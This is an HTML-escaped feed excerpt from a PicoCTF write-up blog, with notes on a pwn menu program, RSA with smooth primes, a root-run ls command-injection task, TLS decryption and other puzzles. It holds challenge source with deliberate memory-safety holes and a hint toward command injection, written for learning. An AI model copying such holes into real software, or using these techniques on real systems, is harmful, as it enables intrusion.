&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">printMenu&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	puts(&lt;span style="color:#e6db74">&amp;#34;Welcome to my stream! ^W^&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	puts(&lt;span style="color:#e6db74">&amp;#34;==========================&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	puts(&lt;span style="color:#e6db74">&amp;#34;(S)ubscribe to my channel&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	puts(&lt;span style="color:#e6db74">&amp;#34;(I)nquire about account deletion&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	puts(&lt;span style="color:#e6db74">&amp;#34;(M)ake an Twixer account&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	puts(&lt;span style="color:#e6db74">&amp;#34;(P)ay for premium membership&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;(l)eave a message(with or without logging in)&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;(e)xit&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">processInput&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> scanf(&lt;span style="color:#e6db74">&amp;#34; %c&amp;#34;&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>choice);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> choice &lt;span style="color:#f92672">=&lt;/span> toupper(choice);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">switch&lt;/span>(choice){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;S&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span>(user){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 		user&lt;span style="color:#f92672">-&amp;gt;&lt;/span>whatToDo &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)s;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		puts(&lt;span style="color:#e6db74">&amp;#34;Not logged in!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;P&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	user&lt;span style="color:#f92672">-&amp;gt;&lt;/span>whatToDo &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)p;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;I&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	user&lt;span style="color:#f92672">-&amp;gt;&lt;/span>whatToDo &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)i;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;M&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	user&lt;span style="color:#f92672">-&amp;gt;&lt;/span>whatToDo &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)m;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;===========================&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;Registration: Welcome to Twixer!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;Enter your username: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	user&lt;span style="color:#f92672">-&amp;gt;&lt;/span>username &lt;span style="color:#f92672">=&lt;/span> getsline();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;L&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	leaveMessage();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;E&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	exit(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">default&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;Invalid option!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	exit(&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	 &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setbuf(stdout, NULL);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	user &lt;span style="color:#f92672">=&lt;/span> (cmd &lt;span style="color:#f92672">*&lt;/span>)malloc(&lt;span style="color:#66d9ef">sizeof&lt;/span>(user));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">while&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		printMenu();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		processInput();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#75715e">//if(user){
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>			doProcess(user);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#75715e">//}
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Very Smooth</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---very-smooth/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---very-smooth/</guid><description>&lt;h1 id="picoctf---very-smooth">
 PicoCTF - Very Smooth
 &lt;a class="anchor" href="#picoctf---very-smooth">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_module_attack/#p-1">$p-1$ Smooth&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">#!/usr/bin/python

from binascii import hexlify
from gmpy2 import *
import math
import os
import sys

if sys.version_info &amp;lt; (3, 9):
 math.gcd = gcd
 math.lcm = lcm

_DEBUG = False

FLAG = open(&amp;#39;flag.txt&amp;#39;).read().strip()
FLAG = mpz(hexlify(FLAG.encode()), 16)
SEED = mpz(hexlify(os.urandom(32)).decode(), 16)
STATE = random_state(SEED)

def get_prime(state, bits):
 return next_prime(mpz_urandomb(state, bits) | (1 &amp;lt;&amp;lt; (bits - 1)))

def get_smooth_prime(state, bits, smoothness=16):
 p = mpz(2)
 p_factors = [p]
 while p.bit_length() &amp;lt; bits - 2 * smoothness:
 factor = get_prime(state, smoothness)
 p_factors.append(factor)
 p *= factor

 bitcnt = (bits - p.bit_length()) // 2

 while True:
 prime1 = get_prime(state, bitcnt)
 prime2 = get_prime(state, bitcnt)
 tmpp = p * prime1 * prime2
 if tmpp.bit_length() &amp;lt; bits:
 bitcnt += 1
 continue
 if tmpp.bit_length() &amp;gt; bits:
 bitcnt -= 1
 continue
 if is_prime(tmpp + 1):
 p_factors.append(prime1)
 p_factors.append(prime2)
 p = tmpp + 1
 break

 p_factors.sort()

 return (p, p_factors)

e = 0x10001

while True:
 p, p_factors = get_smooth_prime(STATE, 1024, 16)
 if len(p_factors) != len(set(p_factors)):
 continue
 # Smoothness should be different or some might encounter issues.
 q, q_factors = get_smooth_prime(STATE, 1024, 17)
 if len(q_factors) != len(set(q_factors)):
 continue
 factors = p_factors + q_factors
 if e not in factors:
 break

if _DEBUG:
 import sys
 sys.stderr.write(f&amp;#39;p = {p.digits(16)}\n\n&amp;#39;)
 sys.stderr.write(f&amp;#39;p_factors = [\n&amp;#39;)
 for factor in p_factors:
 sys.stderr.write(f&amp;#39; {factor.digits(16)},\n&amp;#39;)
 sys.stderr.write(f&amp;#39;]\n\n&amp;#39;)

 sys.stderr.write(f&amp;#39;q = {q.digits(16)}\n\n&amp;#39;)
 sys.stderr.write(f&amp;#39;q_factors = [\n&amp;#39;)
 for factor in q_factors:
 sys.stderr.write(f&amp;#39; {factor.digits(16)},\n&amp;#39;)
 sys.stderr.write(f&amp;#39;]\n\n&amp;#39;)

n = p * q

m = math.lcm(p - 1, q - 1)
d = pow(e, -1, m)

c = pow(FLAG, e, n)

print(f&amp;#39;n = {n.digits(10)}&amp;#39;)
print(f&amp;#39;c = {c.digits(10)}&amp;#39;)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - VNE</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---vne/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---vne/</guid><description>&lt;h1 id="picoctf---vne">
 PicoCTF - VNE
 &lt;a class="anchor" href="#picoctf---vne">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>System Environment
Command Injection&lt;/p>
&lt;h2 id="description--hint">
 Description &amp;amp; Hint
 &lt;a class="anchor" href="#description--hint">#&lt;/a>
&lt;/h2>
&lt;p>We&amp;rsquo;ve got a binary that can list directories as root, try it out !! ssh to saturn.picoctf.net:53176, and run the binary named &amp;ldquo;bin&amp;rdquo; once connected. Login as ctf-player with the password, d137d16e&lt;/p>
&lt;ul>
&lt;li>Hint 1: Have you checked the content of the /root folder&lt;/li>
&lt;li>Hint 2: Find a way to add more instructions to the ls&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Main Function&lt;/p></description></item><item><title>PicoCTF - WebNet0</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---webnet0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---webnet0/</guid><description>&lt;h1 id="picoctf---webnet0">
 PicoCTF - WebNet0
 &lt;a class="anchor" href="#picoctf---webnet0">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://blog.csdn.net/walleva96/article/details/106844033">解密TLS協議全記錄之利用wireshark解密&lt;/a>&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題其實就只是利用wireshark把訊息解密就這樣，所以看了一些文章後就按圖施工就好，解密完後就直接string search就找到了&lt;/p>
&lt;h2 id="exploit---tls-decrypt">
 Exploit - TLS Decrypt
 &lt;a class="anchor" href="#exploit---tls-decrypt">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>在&lt;code>Edit/Preferences/RSA Keys/&lt;/code>中&lt;code>Add new keyfile&lt;/code>
&lt;img src="https://hackmd.io/_uploads/ByMdwwSe6.png" alt="" />&lt;/li>
&lt;li>加入題目給的private key file後記得要重新開啟該pcap file
&lt;img src="https://hackmd.io/_uploads/S1PMPDSx6.png" alt="" />&lt;/li>
&lt;/ol></description></item><item><title>PicoCTF - WhitePages</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/general/picoctf---whitepages/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/general/picoctf---whitepages/</guid><description>&lt;h1 id="picoctf---whitepages">
 PicoCTF - WhitePages
 &lt;a class="anchor" href="#picoctf---whitepages">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/51?category=4&amp;amp;page=3">WhitePages&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler source text&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-text!" data-lang="text!">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p>
&lt;h2 id="exploit---binary-encoding">
 Exploit - Binary Encoding
 &lt;a class="anchor" href="#exploit---binary-encoding">#&lt;/a>
&lt;/h2>
&lt;p>If you use sublime editor to observe the file, then you may see the result as below.
&lt;img src="https://i.imgur.com/ME4F3hm.png" alt="" />
In unicode, &lt;code>&amp;lt;0x2003&amp;gt;&lt;/code> is a kind of white space, then some gap between &lt;code>&amp;lt;0x2003&amp;gt;&lt;/code> is a normal white space. Obviously, this is a binary encoding(&lt;code>&amp;lt;0x2003&amp;gt;&lt;/code> is 0 and normal white space is 1)&lt;/p></description></item><item><title>PicoCTF - Who are you?</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---who-are-you_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---who-are-you_/</guid><description>&lt;h1 id="picoctf---who-are-you">
 PicoCTF - Who are you?
 &lt;a class="anchor" href="#picoctf---who-are-you">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h3 id="chrome-85-更新淺談-referer-policy-和更新影響">
 &lt;a href="https://www.maxlist.xyz/2020/08/03/chrome-85-referer-policy/">【Chrome 85 更新】淺談 Referer-Policy 和更新影響&lt;/a>
 &lt;a class="anchor" href="#chrome-85-%e6%9b%b4%e6%96%b0%e6%b7%ba%e8%ab%87-referer-policy-%e5%92%8c%e6%9b%b4%e6%96%b0%e5%bd%b1%e9%9f%bf">#&lt;/a>
&lt;/h3>
&lt;blockquote>
&lt;h3 id="http-referer-是什麼">
 HTTP Referer 是什麼?
 &lt;a class="anchor" href="#http-referer-%e6%98%af%e4%bb%80%e9%ba%bc">#&lt;/a>
&lt;/h3>
&lt;p>當使用者訪問網站時，會發送請求 (request) 給伺服器主機，而請求 header 中會有一個欄位是「referer」，而此欄位會存放當前請求來源的位置，也就是說請求的來源頁面。&lt;/p>
&lt;p>舉個例子：當小明從「iT邦幫忙」網站中點擊連結後，進入「Max 行銷誌」網站時，所發送的 request 請求 referer 就會是 &lt;a href="https://ithelp.ithome.com.tw/">https://ithelp.ithome.com.tw/&lt;/a> 的網址。&lt;/p>&lt;/blockquote>
&lt;h3 id="rfc-2616---date">
 &lt;a href="https://datatracker.ietf.org/doc/html/rfc2616#section-14.18">RFC 2616 - Date&lt;/a>
 &lt;a class="anchor" href="#rfc-2616---date">#&lt;/a>
&lt;/h3>
&lt;blockquote>
&lt;p>The Date general-header field represents the date and time at which
the message was originated, having the same semantics as orig-date in
RFC 822. The field value is an HTTP-date, as described in section
3.3.1; it MUST be sent in RFC 1123 [8]-date format.&lt;/p></description></item><item><title>PicoCTF - Wireshark twoo twooo two twoo...</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---wireshark-twoo-twooo-two-twoo_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---wireshark-twoo-twooo-two-twoo_/</guid><description>&lt;h1 id="picoctf---wireshark-twoo-twooo-two-twoo">
 PicoCTF - Wireshark twoo twooo two twoo&amp;hellip;
 &lt;a class="anchor" href="#picoctf---wireshark-twoo-twooo-two-twoo">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/110?category=4&amp;amp;page=1">Wireshark twoo twooo two twoo&amp;hellip;&lt;/a>&lt;/p>
&lt;h2 id="exploit---dns--sub-domain">
 Exploit - DNS + sub-domain
 &lt;a class="anchor" href="#exploit---dns--sub-domain">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Statistic
Using statistic to analyze http requests and you&amp;rsquo;ll see that there is &lt;code>/flag&lt;/code> and &lt;code>/&lt;/code> in address &lt;code>18.217.1.57&lt;/code>. Maybe it&amp;rsquo;s a clue or key to find flag
&lt;img src="https://i.imgur.com/VjobDhE.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>String search technique&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ strings shark2.pcapng | grep &amp;#34;pico&amp;#34;
picoCTF{bfe48e8500c454d647c55a4471985e776a07b26cba64526713f43758599aa98b}
picoCTF{bda69bdf8f570a9aaab0e4108a0fa5f64cb26ba7d2269bb63f68af5d98b98245}
picoCTF{fe83bcb6cfd43d3b79392f6a4232685f6ed4e7a789c2ce559cf3c1ab6adbe34b}
picoCTF{711d3893d90f100c15e10ef4842abeed3a830f8237c1257cd47389646da97810}
picoCTF{3cf1e22d489fcfb6bb312a34f46c8699989ed043406134331452d11ce73cd59e}
picoCTF{b4cc138bb0f7f9da7e35085e349555aa6d00bdca3b021c1fe8663c0a422ce0d7}
picoCTF{41b8a1a796bd8d202016f75bc5b38889e9ea06007e6b22fc856d380fb7573133}
...
&lt;/code>&lt;/pre>&lt;p>You&amp;rsquo;ll find tons of fake flag. Obviously, it&amp;rsquo;s a trap to distract you.&lt;/p></description></item><item><title>PicoCTF - Wizardlike</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---wizardlike/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---wizardlike/</guid><description>&lt;h1 id="picoctf---wizardlike">
 PicoCTF - Wizardlike
 &lt;a class="anchor" href="#picoctf---wizardlike">#&lt;/a>
&lt;/h1>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題蠻有趣的，如果只是單純執行程式碼，會發現是一個迷宮的遊戲，不過走越多會發現兩個現象&lt;/p>
&lt;ol>
&lt;li>遊戲本身根本無法破關&lt;/li>
&lt;li>有一些&amp;quot;道路&amp;quot;回隨著角色本身的移動慢慢浮現出來&lt;/li>
&lt;/ol>
&lt;p>我也不知道是哪來的想法直覺想要看他的地圖，因為看IDA翻出來的code，貌似有十個關卡，而如果把地圖翻出來會發現每一個關卡總共會有10000個字元，然後每一列都是100個字元呈現，然後就發現他其實是用地圖的方式呈現他的flag，則我們可以先把10個關卡的所有字元另存一個檔案(純手工)，再寫一點點script就可以把flag還原&lt;/p>
&lt;h2 id="exploit---通靈">
 Exploit - 通靈
 &lt;a class="anchor" href="#exploit---%e9%80%9a%e9%9d%88">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>f &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;./cipher.txt&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>read()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pt &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;./flag.txt&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;w&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flag &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join([f[&lt;span style="color:#ae81ff">100&lt;/span> &lt;span style="color:#f92672">*&lt;/span> i : &lt;span style="color:#ae81ff">100&lt;/span> &lt;span style="color:#f92672">*&lt;/span> i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>] &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(len(f) &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>)])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pt&lt;span style="color:#f92672">.&lt;/span>write(flag)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::spoiler flag&lt;/p>
&lt;pre tabindex="0">&lt;code>######### 
#.......# ......#................................... 
#.......# ....................####.#####.#####..###. 
#........ .####.#..###..###..#.......#...#......#... 
#.......# .# #.#.#....# #.#.......#...###...#.... 
#.......# .####.#.#....# #.#.......#...#......#... 
#.......# .#....#..###..###...####...#...#......###. 
#.......# .#........................................ 
#.......# .......................................... 
#.......# 
#.......# 
#.......# 
#.......# 
#.......# 
#......&amp;gt;# 
######### 
#####. ............................................................. 
#.&amp;lt;.#. ...............#..#.............##.......#..#........#....... 
#...#. .#..#.###......#..#.......#...#..#.####..#..#.###....#....... 
#...#. .#..#.#........####.......#.#.#..#...#...####.#...####....... 
#...#. .####.#...####....#.#####..#.#..###.####....#.#...####.#####. 
 . ............................................................. 
 . ............................................................. 
 . ............................................................. 
#.... 
#...# 
#...# 
#...# 
#...# 
#...# 
#.&amp;gt;.# 
##### 
################# ....... 
#&amp;lt;..............#. ..###.. 
#...............#.. .#...#. 
#..............#......###.. 
#...#.......#...#.. .#...#. 
#..###.....###..#. ..###.. 
#...#...#...#...# ....... 
#......#&amp;gt;#......# ....... 
#...............# 
#...#.......#...# 
#..###.....###..# 
#...#.......#...# 
#...............# 
#...............# 
#...............# 
################# 
... .. ....... 
.&amp;lt;. ####. .#####. 
... ...#.. .#..... 
... ...#....###... 
 ..&amp;gt;#.. .#..... 
 ####. .#..... 
 .. ....... 
 ....... 
 
######################## 
#&amp;lt;.............#.......# 
#..............#.#...#.# 
#..............#.#...#.# 
#..............#.#####.# 
#..............#.....#.# 
#..............#.....#.# 
#..............#.......# 
#..............#.......# 
######################## 
....... 
.&amp;lt;..... 
....... 
....... 
....... 
....... 
....... 
....... 
....... 
....... 
....... 
.....&amp;gt;. 
....... 
####### 
....... 
.####.. 
.#...#. 
.####.. 
.#...#. 
.####.. 
....... 
....... 
... 
.&amp;lt;......... 
........... 
... .. 
 .. 
 .. 
 .. 
 .. 
 .. 
 .. 
 .............. 
 ..##########.. 
 .# #. 
 .# ....... #. 
 .# ..###.. #. 
 .# .#...#. #. 
 .# .#...#. #. 
 .# .#...#. #. 
 .# ..###.. #. 
 .# ....... #. 
 .# ....... #. 
 .# #. 
 ..##########.. 
 .............&amp;gt; 
######################### 
#&amp;lt;#......#.#.......###..# 
#.#.###..#.#.......##..## 
#.#.#.#..#.#.......#..### 
#.#.#.#..#.#.......#...## 
#...#....#..#......#....# 
#.######.##..###.###....# 
#.#.....................# 
#.###.#################.# 
#.......................# 
#########.###.#########.# 
#.......#.#.#.#.........# 
#.#...#.#.#...#.######### 
#.#...#.#.#.#.#.........# 
#.#####.#.#.#.#########.# 
#.....#.#.#.#.#.........# 
#.....#.#.#.#.#.######### 
#.......#.#.#.#.........# 
#.......#.#.#.#########.# 
#########.#.#.#...#...#.# 
#...........#.#.#.#.#.#.# 
#########...#.#.#.#.#.#.# 
#.......#...#.#.#.#.#.#.# 
####.####...#.#.#.#.#.#.# 
##..........#.#.#.#.#.#.# 
#.#..####...#.#.#.#.#.#.# 
#..#....#####.#.#.#.#.#.# 
#...#...#...#.#.#...#...# 
#....#........#.######### 
#...........#.#........&amp;gt;# 
########################. 
... .......
.&amp;lt;. ..###..
... .#...#.
... .#####.
 .#...#.
 .#...#.
 .......
 .......
 
#####################################################################################..............#
#####################################################################################.#####.###....#
#####################################################################################.#.......#....#
#####################################################################################.###......#...#
#####################################################################################.#.......#....#
#####################################################################################.#####.###....#
#####################################################################################..............#
#####################################################################################..............#
